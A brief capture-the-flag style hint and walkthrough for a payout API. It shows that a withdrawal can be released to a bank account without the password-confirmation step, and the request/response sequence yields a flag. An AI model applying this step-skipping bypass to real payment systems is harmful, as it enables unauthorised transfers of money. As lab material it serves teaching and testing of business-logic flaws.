* Hint : **Multi-step sequences are always buggy.**

  * In withdraw `/api/payouts` -> `{"amount":1,"iban":"DE00"}` -> `{"id":1,"status":"initiated","message":"Withdrawal initiated. Confirm it to authorise the transfer."}`
  * Action confirm `/api/payouts/1/confirm` -> `{"password":"Pass@123"}` -> `{"id":1,"status":"confirmed","message":"Withdrawal confirmed."}`
  * Action release `/api/payouts/1/release` -> `{"id":1,"status":"released","amount":1,"message":"Withdrawal released to your bank account."}`
  * Another without confirm : make another withdraw but now we skip confirm action and release
`/api/payouts/2/release` -> `{"id":2,"status":"released","amount":2,"message":"Withdrawal released to your bank account.","compliance_reference":"bug{x}"}`

